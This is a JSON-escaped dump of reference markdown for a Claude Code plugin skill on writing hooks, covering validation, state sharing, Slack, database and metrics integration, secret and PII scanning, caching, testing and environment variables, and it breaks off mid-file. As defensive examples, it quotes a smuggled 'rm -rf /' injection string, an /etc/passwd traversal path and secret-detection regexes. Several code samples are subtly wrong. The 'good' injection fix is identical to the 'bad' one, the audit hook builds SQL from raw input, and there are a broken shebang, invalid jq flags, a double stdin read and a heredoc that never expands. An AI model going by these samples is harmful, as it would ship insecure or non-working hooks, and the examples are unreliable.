extension=\"${file_path##*.}\"\n  allowed=$(echo \"$ALLOWED_EXTENSIONS\" | jq -e \". | index(\\\"$extension\\\")\" 2>/dev/null)\n  if [ $? -ne 0 ]; then\n    echo \"{\\\"continue\\\": true, \\\"systemMessage\\\": \\\"File extension .$extension not allowed\\\"}\" >&2\n    exit 2\n  fi\nfi\n\n# Check forbidden paths\nif [ \"$FORBIDDEN_PATHS\" != \"[]\" ]; then\n  for path in $(echo \"$FORBIDDEN_PATHS\" | jq -r '.[]'); do\n    if [[ \"$file_path\" == \"$path\"* ]]; then\n      echo \"{\\\"continue\\\": true, \\\"systemMessage\\\": \\\"Path in forbidden list: $path\\\"}\" >&2\n      exit 2\n    fi\n  done\nfi\n\nexit 0\n```\n\n**Configuration File (.claude/hook-config.json):**\n```json\n{\n  \"strictMode\": true,\n  \"maxFileSize\": 500000,\n  \"allowedExtensions\": [\"js\", \"ts\", \"jsx\", \"tsx\", \"py\", \"md\"],\n  \"forbiddenPaths\": [\"/tmp\", \"/var/log\"],\n  \"requireTests\": true,\n  \"enableSecurityScan\": true,\n  \"rateLimit\": {\n    \"maxOperations\": 50,\n    \"timeWindow\": 60\n  }\n}\n```\n\n### Environment-Based Configuration\n\n```bash\n#!/bin/bash\n# Load config from environment or config file\n\n# Priority: Environment variable > Config file > Default\nCONFIG_SOURCE=\"${HOOK_CONFIG_SOURCE:-config-file}\"\n\ncase \"$CONFIG_SOURCE\" in\n  \"environment\")\n    STRICT_MODE=\"${HOOK_STRICT_MODE:-false}\"\n    MAX_FILE_SIZE=\"${HOOK_MAX_FILE_SIZE:-1000000}\"\n    ;;\n  \"config-file\")\n    CONFIG_FILE=\"${HOOK_CONFIG_FILE:-$CLAUDE_PROJECT_DIR/.claude/hook-config.json}\"\n    if [ -f \"$CONFIG_FILE\" ]; then\n      STRICT_MODE=$(jq -r '.strictMode // false' \"$CONFIG_FILE\")\n      MAX_FILE_SIZE=$(jq -r '.maxFileSize // 1000000' \"$CONFIG_FILE\")\n    else\n      STRICT_MODE=false\n      MAX_FILE_SIZE=1000000\n    fi\n    ;;\n  \"default\")\n    STRICT_MODE=false\n    MAX_FILE_SIZE=1000000\n    ;;\nesac\n\n# Export for use in hook\nexport STRICT_MODE\nexport MAX_FILE_SIZE\n```\n\n---\n\n## State Sharing Between Hooks\n\n### Overview\nShare state across hook executions using temporary files, databases, or external storage.\n\n### Implementation: Shared State File\n\n**Initialization (SessionStart):**\n```bash\n#!/bin/bash\n# Create shared state file\nSTATE_FILE=\"/tmp/hook-state-$$\"\n\ncat > \"$STATE_FILE\" <<'EOF'\n{\n  \"session_start\": \"'$(date -Iseconds)'\",\n  \"test_runs\": 0,\n  \"builds\": 0,\n  \"files_modified\": [],\n  \"decisions\": [],\n  \"warnings\": []\n}\nEOF\n\nchmod 600 \"$STATE_FILE\"\necho \"$STATE_FILE\" > /tmp/hook-state-location\n```\n\n**Update State (PostToolUse):**\n```bash\n#!/bin/bash\nSTATE_FILE=$(cat /tmp/hook-state-location 2>/dev/null || echo \"\")\n\nif [ -z \"$STATE_FILE\" ] || [ ! -f \"$STATE_FILE\" ]; then\n  exit 0\nfi\n\ninput=$(cat)\ntool_name=$(echo \"$input\" | jq -r '.tool_name')\n\n# Update based on tool used\ncase \"$tool_name\" in\n  \"Bash\")\n    command=$(echo \"$input\" | jq -r '.tool_input.command')\n    if [[ \"$command\" == *\"test\"* ]]; then\n      jq '.test_runs += 1' \"$STATE_FILE\" > \"$STATE_FILE.tmp\" && mv \"$STATE_FILE.tmp\" \"$STATE_FILE\"\n    fi\n    if [[ \"$command\" == *\"build\"* ]]; then\n      jq '.builds += 1' \"$STATE_FILE\" > \"$STATE_FILE.tmp\" && mv \"$STATE_FILE.tmp\" \"$STATE_FILE\"\n    fi\n    ;;\n  \"Write\"|\"Edit\")\n    file_path=$(echo \"$input\" | jq -r '.tool_input.file_path')\n    jq --arg fp \"$file_path\" '.files_modified += [$fp]' \"$STATE_FILE\" > \"$STATE_FILE.tmp\" && mv \"$STATE_FILE.tmp\" \"$STATE_FILE\"\n    ;;\nesac\n```\n\n**Read State (Stop):**\n```bash\n#!/bin/bash\nSTATE_FILE=$(cat /tmp/hook-state-location 2>/dev/null || echo \"\")\n\nif [ -z \"$STATE_FILE\" ] || [ ! -f \"$STATE_FILE\" ]; then\n  exit 0\nfi\n\n# Read and analyze state\ntest_runs=$(jq -r '.test_runs' \"$STATE_FILE\")\nbuilds=$(jq -r '.builds' \"$STATE_FILE\")\nfiles_modified=$(jq -r '.files_modified | length' \"$STATE_FILE\")\n\nif [ \"$files_modified\" -gt \"0\" ] && [ \"$test_runs\" -eq \"0\" ]; then\n  echo '{\"decision\": \"block\", \"reason\": \"Files modified but no tests run\"}' >&2\n  exit 2\nfi\n\n# Cleanup\nrm -f \"$STATE_FILE\" /tmp/hook-state-location\n\necho '{\"decision\": \"approve\"}'\nexit 0\n```\n\n### Redis-Based State Sharing\n\nFor distributed or multi-session state:\n\n```bash\n#!/bin/bash\n# Use Redis for state sharing\nREDIS_KEY=\"claude:hooks:session:$$\"\n\n# Store state\nredis-cli SET \"$REDIS_KEY\" \"$(cat state.json)\" EX 3600\n\n# Retrieve state\nSTATE=$(redis-cli GET \"$REDIS_KEY\")\necho \"$STATE\" | jq .\n```\n\n---\n\n## External System Integration\n\n### Overview\nIntegrate hooks with external systems for logging, monitoring, and notifications.\n\n### Slack Integration\n\n**Notification Hook:**\n```bash\n#!/bin/bash\nset -euo pipefail\n\ninput=$(cat)\nnotification_type=$(echo \"$input\" | jq -r '.notification_type // \"unknown\"')\nseverity=$(echo \"$input\" | jq -r '.severity // \"info\"')\n\n# Only send for high-severity notifications\nif [ \"$severity\" != \"error\" ] && [ \"$severity\" != \"warning\" ]; then\n  exit 0\nfi\n\n# Send to Slack\nif [ -n \"${SLACK_WEBHOOK_URL:-}\" ]; then\n  message=\"Claude Notification: $notification_type (Severity: $severity)\"\n\n  curl -X POST \"$SLACK_WEBHOOK_URL\" \\\n    -H 'Content-Type: application/json' \\\n    -d \"{\\\"text\\\":\\\"$message\\\",\\\"attachments\\\":[{\\\"color\\\":\\\"$severity\\\",\\\"text\\\":\\\"$(echo \"$input\" | jq -c .)\\\"}]}\" \\\n    2>/dev/null || true\nfi\n\nexit 0\n```\n\n### Database Logging\n\n**Audit Hook:**\n```bash\n#!/bin/bash\ninput=$(cat)\ntool_name=$(echo \"$input\" | jq -r '.tool_name')\nsession_id=$(echo \"$input\" | jq -r '.session_id')\ntimestamp=$(date -Iseconds)\n\n# Log to database\nif [ -n \"${AUDIT_DB_URL:-}\" ]; then\n  psql \"$AUDIT_DB_URL\" <<EOF 2>/dev/null || true\nINSERT INTO hook_audit_log (session_id, tool_name, event_data, timestamp)\nVALUES ('$session_id', '$tool_name', '$(echo \"$input\" | jq -c .)', '$timestamp');\nEOF\nfi\n\nexit 0\n```\n\n### Metrics Collection\n\n**Metrics Hook:**\n```bash\n#!/bin/bash\ninput=$(cat)\ntool_name=$(echo \"$input\" | jq -r '.tool_name')\nhook_event=$(echo \"$input\" | jq -r '.hook_event_name')\n\n# Send metrics to StatsD/Datadog\nif [ -n \"${STATSD_HOST:-}\" ]; then\n  echo \"claude.hooks.$hook_event.$tool_name:1|c\" | nc -u -w1 \"${STATSD_HOST}\" 8125 2>/dev/null || true\nfi\n\nexit 0\n```\n\n---\n\n## Advanced Security Patterns\n\n### Secret Detection\n\n**Content Scanning Hook:**\n```bash\n#!/bin/bash\nset -euo pipefail\n\ninput=$(cat)\ncontent=$(echo \"$input\" | jq -r '.tool_input.content // empty')\n\nif [ -z \"$content\" ]; then\n  exit 0\nfi\n\n# Check for various secret patterns\npatterns=(\n  # AWS Access Key\n  'AKIA[0-9A-Z]{16}'\n  # AWS Secret Access Key\n  '[A-Za-z0-9/+=]{40}'\n  # GitHub Token\n  'ghp_[A-Za-z0-9]{36}'\n  # Private Key\n  '-----BEGIN.*PRIVATE KEY-----'\n  # API Key\n  'api[_-]?key[\"\\x20]*[:=][\"\\x20]*[A-Za-z0-9]{20,}'\n  # Password assignment\n  'password[\"\\x20]*[:=][\"\\x20]*[\"\\x27]?[^\"'\\x27\\n]{8,}'\n)\n\nfor pattern in \"${patterns[@]}\"; do\n  if echo \"$content\" | grep -Pq \"$pattern\"; then\n    echo '{\"continue\": true, \"systemMessage\": \"Potential secret detected in content. Use environment variables instead.\"}' >&2\n    exit 2\n  fi\ndone\n\nexit 0\n```\n\n### Anomaly Detection\n\n**Behavioral Analysis Hook:**\n```bash\n#!/bin/bash\ninput=$(cat)\ntool_name=$(echo \"$input\" | jq -r '.tool_name')\nsession_id=$(echo \"$input\" | jq -r '.session_id')\n\n# Track tool usage patterns\nHISTORY_FILE=\"/tmp/hook-history-$session_id\"\n\n# Read history\nif [ -f \"$HISTORY_FILE\" ]; then\n  history=$(cat \"$HISTORY_FILE\")\nelse\n  history=\"[]\"\nfi\n\n# Add current tool\necho \"$history\" | jq --arg tool \"$tool_name\" '. + [$tool]' > \"$HISTORY_FILE.tmp\" && \\\n  mv \"$HISTORY_FILE.tmp\" \"$HISTORY_FILE\"\n\n# Analyze patterns\ntool_count=$(jq -r '. | group_by(.) | map({tool: .[0], count: length})' \"$HISTORY_FILE\")\n\n# Detect anomalies (e.g., too many delete operations)\ndelete_count=$(echo \"$tool_count\" | jq 'map(select(.tool | contains(\"delete\") or contains(\"remove\"))) | map(.count) | add // 0')\n\nif [ \"$delete_count\" -gt 5 ]; then\n  echo '{\"continue\": true, \"systemMessage\": \"High number of delete operations detected. Please review your actions.\"}' >&2\n  exit 2\nfi\n\nexit 0\n```\n\n### Compliance Enforcement\n\n**Compliance Hook:**\n```bash\n#!/bash\ninput=$(cat)\nfile_path=$(echo \"$input\" | jq -r '.tool_input.file_path // empty')\n\n# Check for PII (basic pattern)\nif echo \"$file_path\" | grep -qiE \"(pii|personal|ssn|social.*security)\"; then\n  echo '{\"continue\": true, \"systemMessage\": \"PII-related file detected. Ensure compliance with data protection regulations.\"}' >&2\n  exit 2\nfi\n\n# Check content for PII\ncontent=$(echo \"$input\" | jq -r '.tool_input.content // empty')\nif echo \"$content\" | grep -Pq '\\b\\d{3}-\\d{2}-\\d{4}\\b'; then  # SSN pattern\n  echo '{\"continue\": true, \"systemMessage\": \"Potential SSN detected. Ensure data protection compliance.\"}' >&2\n  exit 2\nfi\n\nexit 0\n```\n\n---\n\n## Performance Optimization\n\n### Caching Strategies\n\n**Result Caching:**\n```bash\n#!/bin/bash\ninput=$(cat)\nfile_path=$(echo \"$input\" | jq -r '.tool_input.file_path')\n\n# Create cache key from file path and size\ncache_key=$(echo \"$file_path\" | md5sum | cut -d' ' -f1)\ncache_dir=\"/tmp/hook-cache\"\nmkdir -p \"$cache_dir\"\ncache_file=\"$cache_dir/$cache_key\"\n\n# Check cache\nif [ -f \"$cache_file\" ]; then\n  cache_age=$(($(date +%s) - $(stat -f%m \"$cache_file\" 2>/dev/null || stat -c%Y \"$cache_file\" 2>/dev/null)))\n\n  # Use cache if less than 5 minutes old\n  if [ \"$cache_age\" -lt 300 ]; then\n    cat \"$cache_file\"\n    exit 0\n  fi\nfi\n\n# Perform validation\n# ... validation logic ...\n\n# Cache result\necho \"$validation_result\" > \"$cache_file\"\necho \"$validation_result\"\n```\n\n**State Caching:**\n```bash\n#!/bin/bash\n# Cache expensive operations\n\nCACHE_TTL=300  # 5 minutes\nCACHE_PREFIX=\"hook-validate\"\n\ncache_get() {\n  local key=\"$1\"\n  local cache_file=\"/tmp/$CACHE_PREFIX-$key\"\n\n  if [ -f \"$cache_file\" ]; then\n    local age=$(($(date +%s) - $(stat -f%m \"$cache_file\" 2>/dev/null || stat -c%Y \"$cache_file\" 2>/dev/null)))\n    if [ \"$age\" -lt \"$CACHE_TTL\" ]; then\n      cat \"$cache_file\"\n      return 0\n    fi\n  fi\n  return 1\n}\n\ncache_set() {\n  local key=\"$1\"\n  local value=\"$2\"\n  local cache_file=\"/tmp/$CACHE_PREFIX-$key\"\n\n  echo \"$value\" > \"$cache_file\"\n}\n```\n\n### Parallel Processing\n\n**Batch Validation:**\n```bash\n#!/bin/bash\ninput=$(cat)\n\n# Extract multiple items to validate\nfiles=$(echo \"$input\" | jq -r '.tool_input.files[]')\n\n# Validate in parallel (using background jobs)\npids=()\nwhile IFS= read -r file; do\n  (\n    # Validate single file\n    validate_file \"$file\"\n  ) &\n  pids+=($!)\ndone <<< \"$files\"\n\n# Wait for all validations\nfor pid in \"${pids[@]}\"; do\n  wait \"$pid\"\ndone\n```\n\n---\n\n## Testing Advanced Hooks\n\n### Unit Testing Framework\n\n**Test Suite Structure:**\n```bash\n#!/bin/bash\n# run-tests.sh\n\nTESTS_DIR=\"tests\"\nPASSED=0\nFAILED=0\n\n# Run each test\nfor test_file in \"$TESTS_DIR\"/*.sh; do\n  if [ -f \"$test_file\" ]; then\n    echo \"Running: $(basename \"$test_file\")\"\n\n    if bash \"$test_file\"; then\n      ((PASSED++))\n      echo \"  PASSED\"\n    else\n      ((FAILED++))\n      echo \"  FAILED\"\n    fi\n  fi\ndone\n\necho \"\"\necho \"Results: $PASSED passed, $FAILED failed\"\n[ \"$FAILED\" -eq 0 ] || exit 1\n```\n\n**Test Example:**\n```bash\n#!/bin/bash\n# tests/test-bash-validation-safe.sh\n\nsource \"$(dirname \"$0\")/test-helpers.sh\"\n\n# Test safe command\ninput='{\"tool_input\": {\"command\": \"ls -la\"}}'\nresult=$(echo \"$input\" | bash \"$(dirname \"$0\")/../examples/validate-bash.sh\")\n\nif [ $? -eq 0 ]; then\n  pass \"Safe command approved\"\nelse\n  fail \"Safe command rejected\"\nfi\n```\n\n### Integration Testing\n\n**Test Scenario:**\n```bash\n#!/bin/bash\n# integration-tests/full-workflow.sh\n\n# Setup test environment\nexport CLAUDE_PROJECT_DIR=\"/tmp/test-project\"\nexport CLAUDE_PLUGIN_ROOT=\"$(dirname \"$0\")/..\"\nmkdir -p \"$CLAUDE_PROJECT_DIR\"\n\n# Test SessionStart  PostToolUse  Stop workflow\n\n# 1. Test SessionStart\necho '{}' | bash \"${CLAUDE_PLUGIN_ROOT}/examples/load-context.sh\"\nassert_file_exists \"/tmp/hook-state-$$\" \"State file created\"\n\n# 2. Test PostToolUse (modify file)\necho '{\"tool_name\": \"Write\", \"tool_input\": {\"file_path\": \"test.js\", \"content\": \"console.log(test);\"}}' | \\\n  bash \"${CLAUDE_PLUGIN_ROOT}/examples/track-events.sh\"\nassert_file_exists \"/tmp/test-runs-$$\" \"Test tracking works\"\n\n# 3. Test Stop with enforcement\necho '{\"reason\": \"Task complete\"}' | bash \"${CLAUDE_PLUGIN_ROOT}/examples/enforce-quality.sh\"\nassert_fail \"Should block without tests\"\n\n# Cleanup\nrm -rf \"$CLAUDE_PROJECT_DIR\" /tmp/hook-state-$$ /tmp/test-runs-$$\n\necho \"Integration tests passed!\"\n```\n\n---\n\n## Debugging and Monitoring\n\n### Debug Mode\n\n**Debug Hook:**\n```bash\n#!/bin/bash\ninput=$(cat)\n\n# Enable debug if flag is set\nif [ \"${HOOK_DEBUG:-false}\" = \"true\" ]; then\n  echo \"=== Hook Debug Info ===\" >&2\n  echo \"Session ID: $(echo \"$input\" | jq -r '.session_id')\" >&2\n  echo \"Event: $(echo \"$input\" | jq -r '.hook_event_name')\" >&2\n  echo \"Tool: $(echo \"$input\" | jq -r '.tool_name')\" >&2\n  echo \"Input: $(echo \"$input\" | jq -c .)\" >&2\n  echo \"========================\" >&2\nfi\n\n# ... normal validation logic ...\n\nif [ \"${HOOK_DEBUG:-false}\" = \"true\" ]; then\n  echo \"=== Hook Decision ===\" >&2\n  echo \"Decision: $(jq -r '.decision // \"allow\"' <<< \"$output\")\" >&2\n  echo \"Reason: $(jq -r '.reason // \"N/A\"' <<< \"$output\")\" >&2\n  echo \"=====================\" >&2\nfi\n```\n\n### Logging Hook Decisions\n\n**Decision Logger:**\n```bash\n#!/bin/bash\ninput=$(cat)\noutput=$(cat)  # Hook's output\n\n# Parse decision\ndecision=$(echo \"$output\" | jq -r '.decision // .permissionDecision // \"allow\"')\ntool_name=$(echo \"$input\" | jq -r '.tool_name // \"unknown\"')\nsession_id=$(echo \"$input\" | jq -r '.session_id // \"unknown\"')\n\n# Log to file\nlog_entry=$(jq -n \\\n  --ts \"$(date -Iseconds)\" \\\n  --sid \"$session_id\" \\\n  --tool \"$tool_name\" \\\n  --decision \"$decision\" \\\n  '{\n    timestamp: $ts,\n    session_id: $sid,\n    tool: $tool,\n    decision: $decision\n  }')\n\necho \"$log_entry\" >> ~/.claude/hook-decisions.log\n\nexit 0\n```\n\n### Performance Monitoring\n\n**Performance Hook:**\n```bash\n#!/bin/bash\ninput=$(cat)\n\nstart_time=$(date +%s%N)\n\n# ... hook logic ...\n\nend_time=$(date +%s%N)\nduration=$(( (end_time - start_time) / 1000000 ))  # Convert to milliseconds\n\n# Log performance\necho \"$(date -Iseconds),hook,$duration,ms\" >> ~/.claude/hook-performance.log\n\nexit 0\n```\n\n---\n\n## Best Practices\n\n### Security\n\n1. **Never log secrets**\n   - Sanitize inputs\n   - Remove sensitive data from logs\n   - Use pattern matching carefully\n\n2. **Validate all inputs**\n   - Check data types\n   - Sanitize strings\n   - Handle edge cases\n\n3. **Use least privilege**\n   - Limit file system access\n   - Restrict network access\n   - Run with minimal permissions\n\n### Performance\n\n1. **Cache expensive operations**\n   - File scanning results\n   - External API calls\n   - Complex validations\n\n2. **Set appropriate timeouts**\n   - Quick checks: 5-10s\n   - Standard validation: 15-30s\n   - Complex analysis: 30-60s\n   - Never exceed 60s\n\n3. **Minimize I/O**\n   - Read files once\n   - Batch operations\n   - Use memory for small data\n\n### Maintainability\n\n1. **Document complex logic**\n   - Explain validation criteria\n   - Provide examples\n   - Document configuration\n\n2. **Version your hooks**\n   - Track changes\n   - Support rollback\n   - Test upgrades\n\n3. **Monitor hook behavior**\n   - Track decisions\n   - Identify false positives\n   - Gather user feedback\n\n### Reliability\n\n1. **Handle errors gracefully**\n   - Provide clear messages\n   - Don't crash on unexpected input\n   - Fail safely\n\n2. **Test thoroughly**\n   - Unit tests for scripts\n   - Integration tests for workflows\n   - User acceptance testing\n\n3. **Provide escape hatches**\n   - Allow bypassing hooks\n   - Support emergency overrides\n   - Document workarounds\n\n---\n\n## Conclusion\n\nAdvanced hook patterns enable sophisticated automation while maintaining security and performance. Use these techniques to:\n\n- **Layer security**: Combine multiple validation approaches\n- **Share state**: Track workflows across events\n- **Integrate systems**: Connect with external tools\n- **Optimize performance**: Cache and parallelize\n- **Monitor behavior**: Track decisions and performance\n\nRemember: With great power comes great responsibility. Always test thoroughly and prioritize user experience over strict enforcement.",
        "plugins/sys-core/skills/managing-hooks/references/command-hooks.md": "# Command Hooks Reference\n\n## Overview\n\nCommand hooks execute bash scripts to perform fast, deterministic validations and operations. They are ideal for file system checks, external tool integration, and performance-critical operations.\n\n## Implementation\n\n### Basic Command Hook\n\n```json\n{\n  \"type\": \"command\",\n  \"command\": \"bash ${CLAUDE_PLUGIN_ROOT}/scripts/validate.sh\",\n  \"timeout\": 30\n}\n```\n\n### Script Structure\n\nUse `set -euo pipefail` for safety:\n\n```bash\n#!/usr/bin/env bash\nset -euo pipefail\n\n# Validate inputs\nif [ -z \"${1:-}\" ]; then\n  echo \"Error: Missing input\" >&2\n  exit 1\nfi\n\n# Perform validation\nif ! some-check \"$1\"; then\n  echo \"Validation failed\" >&2\n  exit 2\nfi\n\nexit 0\n```\n\n## Best Practices\n\n1. **Always use `set -euo pipefail`**\n2. **Validate all inputs**\n3. **Use proper exit codes**\n4. **Quote variables**\n5. **Keep scripts under 60 seconds**\n\n## Security Considerations\n\n- Never trust user input\n- Sanitize all file paths\n- Avoid logging sensitive data\n- Use absolute paths with `${CLAUDE_PLUGIN_ROOT}`\n",
        "plugins/sys-core/skills/managing-hooks/references/configuration.md": "# Hook Configuration Reference\n\n## Hooks Configuration File\n\nThe `hooks/hooks.json` file defines all hook configurations for a plugin.\n\n## File Structure\n\n```json\n{\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n        \"matcher\": \"Write|Edit\",\n        \"hooks\": [\n          {\n            \"type\": \"prompt\",\n            \"prompt\": \"Validate file operations\"\n          }\n        ]\n      }\n    ],\n    \"PostToolUse\": [],\n    \"Stop\": [],\n    \"SessionStart\": [],\n    \"SessionEnd\": [],\n    \"UserPromptSubmit\": [],\n    \"SubagentStop\": []\n  }\n}\n```\n\n## Configuration Options\n\n### Matcher Patterns\n\n- **Exact match:** `\"Write\"`\n- **Multiple:** `\"Write|Edit|Read\"`\n- **Wildcard:** `\"*\"`\n- **Regex:** `\"mcp__.*__delete.*\"`\n\n### Hook Types\n\n- **prompt:** LLM-driven validation\n- **command:** Bash script execution\n\n## Plugin Directory Structure\n\n```\nplugin/\n hooks/\n    hooks.json          # Hook configuration\n scripts/                # Command hook scripts\n    validate.sh\n    notify.sh\n SKILL.md\n```\n\n## Validation\n\nValidate configuration:\n\n```bash\n# Check JSON syntax\njq . hooks/hooks.json\n\n# Validate structure\njq '.hooks | keys' hooks/hooks.json\n```\n",
        "plugins/sys-core/skills/managing-hooks/references/env-vars.md": "# Environment Variables in Hooks\n\n## Overview\n\nHooks have access to specific environment variables depending on their scope and trigger event. Understanding these variables is critical for writing effective hook scripts.\n\n## Global Variables\n\nAvailable in ALL hook contexts:\n\n| Variable | Description | Syntax Variants |\n|:----------|:-------------|:----------------|\n| `CLAUDE_PROJECT_DIR` | Project root directory | `$CLAUDE_PROJECT_DIR`, `${CLAUDE_PROJECT_DIR}` |\n\n**Example:**\n```bash\n#!/bin/bash\n# Hook script\nPROJECT_ROOT=\"${CLAUDE_PROJECT_DIR}\"\necho \"Project: $PROJECT_ROOT\"\n```\n\n## Plugin-Specific Variables\n\nAvailable ONLY in plugin hooks (hooks configured in `plugins/*/hooks/hooks.json`):\n\n| Variable | Description | Example |\n|:----------|:-------------|:--------|\n| `CLAUDE_PLUGIN_ROOT` | Plugin root directory | `/path/to/plugin` |\n\n**Critical:** `${CLAUDE_PLUGIN_ROOT}` is NOT available in project-level hooks (`.claude/settings.json`).\n\n**Example:**\n```bash\n#!/bin/bash\n# Plugin hook script\nPLUGIN_ROOT=\"${CLAUDE_PLUGIN_ROOT}\"\nSCRIPT=\"${PLUGIN_ROOT}/scripts/validate.sh\"\n```\n\n## SessionStart-Specific Variables\n\nAvailable ONLY during SessionStart hooks:\n\n| Variable | Description | Usage |\n|:----------|:-------------|:------|\n| `CLAUDE_ENV_FILE` | Environment file path | Write-only, persist env vars |\n\n**Usage Pattern:**\n```bash\n#!/bin/bash\n# SessionStart hook\n\n# Persist environment variable for session duration\necho 'export MY_VAR=value' >> \"$CLAUDE_ENV_FILE\"\n\n# This variable will be available in all subsequent tool calls\n```\n\n**Important Notes:**\n- File is write-only (append)\n- Variables persist for session duration\n- Use for setup configuration\n\n## Tool Argument Variables\n\nAvailable in PreToolUse and PostToolUse hooks:\n\n| Variable | Description | Example |\n|:----------|:-------------|:--------|\n| `ARGUMENTS` | Tool arguments as JSON | `{\"file_path\": \"/path/to/file\"}` |\n| `TOOL_NAME` | Name of tool being invoked | `Write`, `Bash`, `Read` |\n\n**Access Pattern:**\n```bash\n#!/bin/bash\n# PreToolUse hook\n\n# Arguments come via stdin\nARGUMENTS=$(cat)\n\n# Parse with jq\nFILE_PATH=$(echo \"$ARGUMENTS\" | jq -r '.file_path')\n\n# Validate\nif [ \"$FILE_PATH\" = \"/etc/passwd\" ]; then\n  echo \"Error: Cannot modify system files\" >&2\n  exit 2\nfi\n```\n\n## Variable Expansion\n\n### In JSON Configuration\n\nVariables are expanded in hook configuration:\n\n```json\n{\n  \"hooks\": {\n    \"SessionStart\": [{\n      \"hooks\": [{\n        \"type\": \"command\",\n        \"command\": \"${CLAUDE_PLUGIN_ROOT}/scripts/init.sh\",\n        \"timeout\": 30\n      }]\n    }]\n  }\n}\n```\n\n### In Bash Scripts\n\nStandard bash variable expansion:\n\n```bash\n#!/bin/bash\n# Use quotes for safety\nSCRIPT=\"${CLAUDE_PLUGIN_ROOT}/scripts/script.sh\"\n\n# Use default values if not set\nTIMEOUT=${HOOK_TIMEOUT:-30}\n\n# Conditional usage\nif [ -n \"${CLAUDE_PLUGIN_ROOT}\" ]; then\n  # Running in plugin context\n  PLUGIN_SCRIPT=\"${CLAUDE_PLUGIN_ROOT}/scripts/check.sh\"\nelse\n  # Running in project context\n  PROJECT_SCRIPT=\"${CLAUDE_PROJECT_DIR}/.claude/scripts/check.sh\"\nfi\n```\n\n## Path Best Practices\n\n### Plugin Hooks\n\nAlways use `${CLAUDE_PLUGIN_ROOT}` for plugin-relative paths:\n\n```json\n{\n  \"hooks\": {\n    \"PreToolUse\": [{\n      \"hooks\": [{\n        \"type\": \"command\",\n        \"command\": \"${CLAUDE_PLUGIN_ROOT}/scripts/guard.sh\"\n      }]\n    }]\n  }\n}\n```\n\n### Project Hooks\n\nUse `$CLAUDE_PROJECT_DIR` for project-relative paths:\n\n```json\n{\n  \"hooks\": {\n    \"SessionStart\": [{\n      \"hooks\": [{\n        \"type\": \"command\",\n        \"command\": \"${CLAUDE_PROJECT_DIR}/.claude/scripts/init.sh\"\n      }]\n    }]\n  }\n}\n```\n\n### Absolute Paths (Fallback)\n\nWhen environment variables are uncertain:\n\n```json\n{\n  \"hooks\": {\n    \"SessionStart\": [{\n      \"hooks\": [{\n        \"type\": \"command\",\n        \"command\": \"/usr/local/bin/validate.sh\"\n      }]\n    }]\n  }\n}\n```\n\n## Security Considerations\n\n### Path Traversal Prevention\n\n**Bad:** User-controlled paths\n```bash\n#!/bin/bash\n# DANGEROUS\nUSER_PATH=\"$1\"\ncat \"$USER_PATH\"  # Could be ../../etc/passwd\n```\n\n**Good:** Validate and sanitize\n```bash\n#!/bin/bash\nUSER_PATH=\"$1\"\n# Resolve to absolute path and check it's within project\nREAL_PATH=$(realpath \"$USER_PATH\")\nif [[ \"$REAL_PATH\" != \"${CLAUDE_PROJECT_DIR}\"* ]]; then\n  echo \"Error: Path outside project\" >&2\n  exit 2\nfi\ncat \"$REAL_PATH\"\n```\n\n### Command Injection Prevention\n\n**Bad:** Unsanitized input in command\n```bash\n#!/bin/bash\n# DANGEROUS\nUSER_FILE=\"$1\"\ncat \"$USER_FILE\"  # Could be 'file; rm -rf /'\n```\n\n**Good:** Use proper quoting\n```bash\n#!/bin/bash\nUSER_FILE=\"$1\"\ncat \"$USER_FILE\"  # Properly quoted\n```\n\n### Plugin Root Validation\n\n**Best Practice:** Validate plugin root before using\n\n```bash\n#!/bin/bash\n# Validate CLAUDE_PLUGIN_ROOT\nif [ -z \"${CLAUDE_PLUGIN_ROOT}\" ]; then\n  echo \"Error: CLAUDE_PLUGIN_ROOT not set\" >&2\n  exit 2\nfi\n\nif [ ! -d \"${CLAUDE_PLUGIN_ROOT}\" ]; then\n  echo \"Error: CLAUDE_PLUGIN_ROOT not a directory\" >&2\n  exit 2\nfi\n\nPLUGIN_SCRIPT=\"${CLAUDE_PLUGIN_ROOT}/scripts/script.sh\"\n```\n\n## Debugging Environment Variables\n\n### Test Script\n\n```bash\n#!/bin/bash\n# debug-env.sh\n\necho \"=== Environment Variables ===\"\necho \"CLAUDE_PROJECT_DIR: ${CLAUDE_PROJECT_DIR}\"\necho \"CLAUDE_PLUGIN_ROOT: ${CLAUDE_PLUGIN_ROOT}\"\necho \"CLAUDE_ENV_FILE: ${CLAUDE_ENV_FILE}\"\n\necho \"=== Tool Arguments (if applicable) ===\"\nif [ -n \"$ARGUMENTS\" ]; then\n  echo \"ARGUMENTS: $ARGUMENTS\"\nfi\n\nif [ -n \"$TOOL_NAME\" ]; then\n  echo \"TOOL_NAME: $TOOL_NAME\"\nfi\n```\n\n### Usage in Hook\n\n```json\n{\n  \"hooks\": {\n    \"SessionStart\": [{\n      \"hooks\": [{\n        \"type\": \"command\",\n        \"command\": \"${CLAUDE_PLUGIN_ROOT}/scripts/debug-env.sh > /tmp/hook-env-debug.txt\"\n      }]\n    }]\n  }\n}\n```\n\n## Quick Reference\n\n| Variable | Available In | Scope |\n|:----------|:-------------|:------|\n| `$CLAUDE_PROJECT_DIR` | All hooks | Global |\n| `${CLAUDE_PLUGIN_ROOT}` | Plugin hooks only | Plugin |\n| `$CLAUDE_ENV_FILE` | SessionStart only | Session |\n| `$ARGUMENTS` | PreToolUse, PostToolUse | Tool event |\n| `$TOOL_NAME` | PreToolUse, PostToolUse | Tool event |\n\n## Validation Checklist\n\n- [ ] Correct environment variable for hook scope\n- [ ] `${CLAUDE_PLUGIN_ROOT}` only in plugin hooks\n- [ ] `$CLAUDE_PROJECT_DIR` used in project hooks\n- [ ] Paths properly quoted\n- [ ] Path traversal protection implemented\n- [ ] Command injection prevention implemented\n- [ ] Variables validated before use\n- [ ] Fallback paths for uncertain contexts\n",
        "plugins/sys-core/skills/managing-hooks/references/events.md": "# Hook Events\n\n## Event Types\n\nHooks can be triggered at various points in the AI lifecycle. Each event has specific use cases and data available.\n\n## Lifecycle Events\n\n### SessionStart\n\n**Trigger:** When Claude starts or resumes a session\n\n**Matchers:**\n- `startup` - Initial session start\n- `resume` - Resuming existing session\n- `clear` - After /clear command\n- `compact` - After context compaction\n\n**Use Cases:**\n- Environment validation\n- Dependency checks\n- Setup scripts\n- State initialization\n\n**Data Available:**\n- `$CLAUDE_PROJECT_DIR` - Project root directory\n- `${CLAUDE_PLUGIN_ROOT}` - Plugin root (plugin hooks only)\n- `$CLAUDE_ENV_FILE` - Environment file path (write-only for SessionStart)\n\n**Example:**\n```json\n{\n  \"hooks\": {\n    \"SessionStart\": [{\n      \"matchers\": [\"startup\", \"resume\"],\n      